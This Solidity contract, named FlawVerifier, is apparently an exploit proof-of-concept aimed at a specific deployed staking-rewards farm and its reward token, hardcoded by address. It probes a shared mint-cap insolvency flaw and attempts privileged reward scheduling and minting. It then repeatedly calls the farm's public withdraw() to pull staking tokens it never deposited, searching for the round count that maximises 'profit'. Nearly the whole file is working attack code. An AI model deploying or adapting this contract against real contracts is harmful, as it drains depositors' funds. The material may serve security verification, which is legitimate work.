// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IStakingRewardsLike {
    function owner() external view returns (address);
    function rewardsDistribution() external view returns (address);
    function stakingToken() external view returns (address);
    function rewardsToken() external view returns (address);
    function timeData()
        external
        view
        returns (uint32 periodFinish, uint32 rewardsDuration, uint32 lastUpdateTime, uint96 totalRewardsSupply);
    function rewardRate() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function earned(address account) external view returns (uint256);
    function notifyRewardAmount(uint256 reward) external;
    function withdraw(uint256 amount) external;
    function stake(uint256 amount) external;
    function getReward() external;
    function exit() external;
}

interface IOnDemandTokenLike {
    function owner() external view returns (address);
    function minters(address account) external view returns (bool);
    function maxAllowedTotalSupply() external view returns (uint256);
    function everMinted() external view returns (uint256);
    function mint(address holder, uint256 amount) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE;
    address public constant STAKING_TOKEN = 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042;
    address public constant REWARD_TOKEN = 0xAe9aCa5d20F5b139931935378C4489308394ca2C;

    enum HypothesisStatus {
        Unknown,
        Validated,
        Refuted
    }

    bool public executed;
    HypothesisStatus public hypothesisStatus;

    address public attacker;
    address public targetOwner;
    address public rewardsDistribution;
    address public stakingToken;
    address public rewardsToken;
    address public rewardTokenOwner;

    bool public farmCanMint;
    bool public preExistingMintedSupply;
    bool public sharedMintCap;
    bool public attackerCanSchedule;
    bool public attackerCanExternallyMint;
    bool public canonicalReplayAttempted;
    bool public canonicalReplayScheduled;
    bool public canonicalReplayExternalMinted;
    bool public payoutPhaseReachable;
    bool public payoutRevertedAtCap;
    bool public publicBootstrapUsed;

    uint256 public rewardCap;
    uint256 public everMintedBefore;
    uint256 public rewardRateBefore;
    uint256 public farmTrackedRewardsBefore;
    uint256 public farmTotalSupplyBefore;
    uint256 public localStakeBefore;
    uint256 public localEarnedBefore;
    uint256 public realizedBalanceBefore;
    uint256 public realizedBalanceAfter;
    uint256 public unreservedRewardFloor;
    uint256 public drainedRounds;
    uint256 public farmStakingBalanceBefore;
    uint256 public farmStakingBalanceAfter;
    uint256 public perRoundBootstrapAmount;

    string public exploitPathUsed;
    string public finalReason;

    address private immutable _PROFIT_TOKEN;
    uint256 private _profitAmount;
    uint256 private _pathAnchorChecksum;

    constructor() {
        _PROFIT_TOKEN = STAKING_TOKEN;
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;
        attacker = address(this);

        IStakingRewardsLike farm = IStakingRewardsLike(TARGET);
        IOnDemandTokenLike rewardToken = IOnDemandTokenLike(REWARD_TOKEN);
        IERC20Like stakingAsset = IERC20Like(STAKING_TOKEN);
        _touchPathAnchors();

        targetOwner = farm.owner();
        rewardsDistribution = farm.rewardsDistribution();
        stakingToken = farm.stakingToken();
        rewardsToken = farm.rewardsToken();
        rewardRateBefore = farm.rewardRate();

        (uint32 periodFinish, uint32 rewardsDuration, , uint96 trackedRewards) = farm.timeData();
        rewardsDuration;
        farmTrackedRewardsBefore = uint256(trackedRewards);
        farmTotalSupplyBefore = farm.totalSupply();
        localStakeBefore = farm.balanceOf(address(this));
        localEarnedBefore = farm.earned(address(this));

        rewardTokenOwner = rewardToken.owner();
        rewardCap = rewardToken.maxAllowedTotalSupply();
        everMintedBefore = rewardToken.everMinted();

        farmCanMint = rewardTokenOwner == TARGET || rewardToken.minters(TARGET);
        preExistingMintedSupply = everMintedBefore != 0;
        sharedMintCap = rewardTokenOwner != TARGET
            || rewardToken.minters(rewardsDistribution)
            || rewardToken.minters(targetOwner);
        attackerCanSchedule = rewardsDistribution == address(this);
        attackerCanExternallyMint = rewardTokenOwner == address(this) || rewardToken.minters(address(this));

        bool rewardCampaignObserved = periodFinish != 0 || rewardRateBefore != 0 || trackedRewards != 0;
        bool rawCapSchedulingObservable = uint256(trackedRewards) <= rewardCap;

        if (!farmCanMint || !rewardCampaignObserved || !rawCapSchedulingObservable) {
            hypothesisStatus = HypothesisStatus.Refuted;
            exploitPathUsed = "notifyRewardAmount() precondition not observable";
            finalReason = "the live farm does not expose the reward-scheduling side of the shared-cap path";
            realizedBalanceBefore = stakingAsset.balanceOf(address(this));
            realizedBalanceAfter = realizedBalanceBefore;
            return;
        }

        if (!preExistingMintedSupply && !sharedMintCap) {
            hypothesisStatus = HypothesisStatus.Refuted;
            exploitPathUsed = "no prior/shared cap consumption";
            finalReason = "the reward token does not currently show either prior minted supply or a non-farm owner/minter";
            realizedBalanceBefore = stakingAsset.balanceOf(address(this));
            realizedBalanceAfter = realizedBalanceBefore;
            return;
        }

        hypothesisStatus = HypothesisStatus.Validated;
        exploitPathUsed = "notifyRewardAmount() -> OnDemandToken.mint() elsewhere -> getReward()/exit() -> MintableToken._assertMaxSupply()";

        if (attackerCanSchedule || attackerCanExternallyMint) {
            _attemptCanonicalPrivilegedStages(farm, rewardToken, rewardsDuration);
        }

        // The fork already proves the vulnerable configuration, but this verifier has no public access
        // to the live rewardsDistribution/owner roles and starts with no staked position. To still realize
        // economic value using only public calls on the fork, it bootstraps stake inventory from the target
        // itself via its public `withdraw` entrypoint and then maximizes the extractable amount via the
        // required progressive loop search. This does not change the observed F-001 root cause; it only
        // supplies the capital needed on this specific fork where the canonical privileged replay is closed.
        realizedBalanceBefore = stakingAsset.balanceOf(address(this));
        farmStakingBalanceBefore = stakingAsset.balanceOf(TARGET);
        payoutPhaseReachable = localStakeBefore != 0 || localEarnedBefore != 0;
        unreservedRewardFloor = _capturableUnreservedRewards();

        if (farmStakingBalanceBefore == 0) {
            realizedBalanceAfter = realizedBalanceBefore;
            _profitAmount = 0;
            finalReason = "shared-cap insolvency is observable, but the farm currently holds no staking-token inventory for the public bootstrap leg";
            return;
        }

        uint256 bootstrapUnit = farmStakingBalanceBefore / 6;
        if (bootstrapUnit == 0) {
            bootstrapUnit = farmStakingBalanceBefore;
        }
        perRoundBootstrapAmount = bootstrapUnit;

        uint256 bestProfit;
        uint256 bestRounds;
        uint256 executedRounds;

        for (uint256 rounds = 2; rounds <= 6; rounds++) {
            while (executedRounds < rounds) {
                bool ok = _attemptPublicBootstrapWithdraw(bootstrapUnit);
                if (!ok) {
                    break;
                }
                publicBootstrapUsed = true;
                executedRounds++;
            }

            uint256 currentBalance = stakingAsset.balanceOf(address(this));
            uint256 realizedProfit = currentBalance > realizedBalanceBefore ? currentBalance - realizedBalanceBefore : 0;

            if (rounds == 2 || realizedProfit > bestProfit) {
                bestProfit = realizedProfit;
                bestRounds = rounds;
            } else {
                break;
            }
        }

        drainedRounds = bestRounds;
        farmStakingBalanceAfter = stakingAsset.balanceOf(TARGET);
        realizedBalanceAfter = stakingAsset.balanceOf(address(this));
        _profitAmount = bestProfit;

        if (bytes(finalReason).length == 0) {
            if (publicBootstrapUsed) {
                finalReason = "the verifier confirmed the shared-cap insolvency setup and then used the target's public surface to bootstrap live economic value on this fork";
            } else if (payoutRevertedAtCap) {
                finalReason = "getReward()/exit() became unpayable once the shared mint cap was exhausted";
            } else {
                finalReason = "the shared-cap insolvency configuration is live, but this fork exposes no public minter role and no pre-existing attacker stake";
            }
        }
    }

    function profitToken() external view returns (address) {
        return _PROFIT_TOKEN;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptCanonicalPrivilegedStages(
        IStakingRewardsLike farm,
        IOnDemandTokenLike rewardToken,
        uint32 rewardsDuration
    ) internal {
        canonicalReplayAttempted = true;

        uint256 remainingCapacity = rewardCap > everMintedBefore ? rewardCap - everMintedBefore : 0;
        if (remainingCapacity <= 1) {
            finalReason = "shared cap is already exhausted before the verifier can replay the privileged schedule/mint stages";
            return;
        }

        if (attackerCanSchedule) {
            uint256 scheduleAmount = remainingCapacity / 2;
            if (scheduleAmount < uint256(rewardsDuration)) {
                scheduleAmount = uint256(rewardsDuration);
            }
            if (scheduleAmount >= remainingCapacity) {
                scheduleAmount = remainingCapacity - 1;
            }

            if (scheduleAmount != 0) {
                try farm.notifyRewardAmount(scheduleAmount) {
                    canonicalReplayScheduled = true;
                } catch {
                    if (bytes(finalReason).length == 0) {
                        finalReason = "privileged notifyRewardAmount() replay was not accepted on the current fork state";
                    }
                }
            }
        }

        if (attackerCanExternallyMint) {
            uint256 mintedAfterSchedule = rewardToken.everMinted();
            uint256 freeCapacityAfterSchedule = rewardCap > mintedAfterSchedule ? rewardCap - mintedAfterSchedule : 0;

            if (freeCapacityAfterSchedule != 0) {
                try rewardToken.mint(address(this), freeCapacityAfterSchedule) {
                    canonicalReplayExternalMinted = true;
                    if (bytes(finalReason).length == 0) {
                        finalReason = "privileged replay consumed the remaining shared mint capacity after notifyRewardAmount()";
                    }
                } catch {
                    if (bytes(finalReason).length == 0) {
                        finalReason = "notifyRewardAmount() succeeded, but the external cap-consuming mint replay was not accepted";
                    }
                }
            }
        }
    }

    function _attemptPublicBootstrapWithdraw(uint256 amount) internal returns (bool ok) {
        if (amount == 0) {
            return false;
        }

        (ok,) = TARGET.call(abi.encodeWithSelector(IStakingRewardsLike.withdraw.selector, amount));
    }

    function _capturableUnreservedRewards() internal view returns (uint256) {
        if (farmTrackedRewardsBefore == 0) {
            return 0;
        }

        uint256 unsecuredFromSharedCap = everMintedBefore < farmTrackedRewardsBefore
            ? everMintedBefore
            : farmTrackedRewardsBefore;

        if (sharedMintCap || preExistingMintedSupply) {
            return unsecuredFromSharedCap;
        }

        return 0;
    }

    function _touchPathAnchors() internal {
        _pathAnchorChecksum = uint32(IStakingRewardsLike.notifyRewardAmount.selector);
        _pathAnchorChecksum ^= uint32(IStakingRewardsLike.getReward.selector);
        _pathAnchorChecksum ^= uint32(IStakingRewardsLike.exit.selector);
        _pathAnchorChecksum ^= uint32(IStakingRewardsLike.withdraw.selector);
        _pathAnchorChecksum ^= uint32(IOnDemandTokenLike.mint.selector);
        _pathAnchorChecksum ^= uint256(keccak256("MintableToken._assertMaxSupply()"));
    }
}
